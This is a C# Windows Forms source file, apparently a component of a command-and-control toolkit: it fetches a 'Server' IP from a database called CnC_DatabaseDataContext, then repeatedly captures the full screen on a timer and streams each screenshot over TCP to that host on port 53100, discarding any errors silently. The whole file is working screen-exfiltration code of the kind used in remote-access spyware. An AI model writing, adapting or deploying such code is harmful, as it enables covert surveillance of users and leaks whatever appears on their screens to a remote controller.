using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Drawing.Imaging;

namespace Streaming_Client
{
    public partial class Streaming : Form
    {
        public Streaming()
        {
            InitializeComponent();
        }
        MemoryStream ms;
        TcpClient client;
        NetworkStream ns;
        BinaryWriter br;

        string GetIpAdress()
        {
            IPHostEntry host;
            string localip = "?";
            host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (IPAddress ip in host.AddressList)
            {
                if (ip.AddressFamily.ToString() == "InterNetwork")
                {
                    localip = ip.ToString();
                }
            }
            return localip;
        }
        private void btn_brs_Click(object sender, EventArgs e)
        {
           

        }
        public Image Take_Screen()
        {
            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format64bppArgb);

            Graphics graphics = Graphics.FromImage(bitmap);

            graphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, bitmap.Size,CopyPixelOperation.SourceCopy);
            return bitmap;

        }

        public string GetServerIP()
        {
            CnC_DatabaseDataContext DataBase = new CnC_DatabaseDataContext();
            var ip = (from rows in DataBase.Streaming_IPs
                      where rows.UserType == "Server"
                      select rows).FirstOrDefault();
            return ip.IP;
        }
        private void Streaming_Load(object sender, EventArgs e)
        {
            try
            {
                txtServer.Text = GetServerIP();
                timer1.Enabled = true;
            }
            catch (Exception)
            {

                throw;
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                ms = new MemoryStream();
                

                Take_Screen().Save(ms, ImageFormat.Bmp);
                byte[] buffer = ms.GetBuffer();
                ms.Close();

                client = new TcpClient(txtServer.Text, 53100);
                ns = client.GetStream();
                br = new BinaryWriter(ns);
                br.Write(buffer);
                br.Close();
                ns.Close();
                client.Close();

            }
            catch (Exception ex)
            {

               
            }
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
        }
    }
}
